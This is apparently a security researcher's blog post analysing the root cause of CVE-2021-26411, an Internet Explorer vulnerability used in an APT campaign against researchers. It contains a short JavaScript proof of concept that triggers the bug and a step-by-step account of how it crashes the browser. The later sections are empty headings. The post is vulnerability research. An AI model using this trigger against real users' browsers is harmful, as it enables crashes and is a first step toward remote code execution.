---
layout: post
toc: true
title: "RCA of CVE-2021-26411"
tags: [IE, 0day, In The Wild]
author:
  - @iamelli0t
---

In January of this year, Google and Microsoft respectively published blogs revealing attacks on security researchers by an APT group in North Korea[1][2]. A vulnerability in Internet Explorer used in this attack was fixed as CVE-2021-26411 in Microsoft's Patch Tuesday this month[3]. The vulnerability is triggered when users of the affected version of Internet Explorer access a malicious link constructed by the attacker, causing remote code execution.

## root casue analysis
The POC that can trigger the vulnerability is shown below:
```html
<script>
var elem = document.createElement('xxx'); 
var attr1 = document.createAttribute('yyy'); 
var attr2 = document.createAttribute('zzz'); 

var obj = {};
obj.valueOf = function() {
	elem.clearAttributes();
	return 0x1337;
};

attr1.nodeValue = obj;
attr2.nodeValue = 123;
elem.setAttributeNode(attr1);
elem.setAttributeNode(attr2);
elem.removeAttributeNode(attr1); 
</script>

Execution process of POC:
1. Create 1 HTML Element object (elem) and 2 HTML Attribute objects (attr1 and attr2)
2. Assign a value to the nodeValue of two Attribute objects, where attr1's nodeValue points to an Object that overloads ValueOf
3. Bind two Attribute objects attr1 and attr2 to Element object elem
4. Call elem.removeAttributeNode(attr1) to remove the attribute attr1 object of 'xxx'
5. The removeAttributeNode method triggers a callback to the valueOf function, during which clearAttributes() is called to clear all attribute objects bound by the eLEM object: attr1 and attr2
6. ValueOf callback returns, IE Tab process crashes at null pointer dereference:


## from nullptr dereference to read/write primitive


## some thoughts


## refrences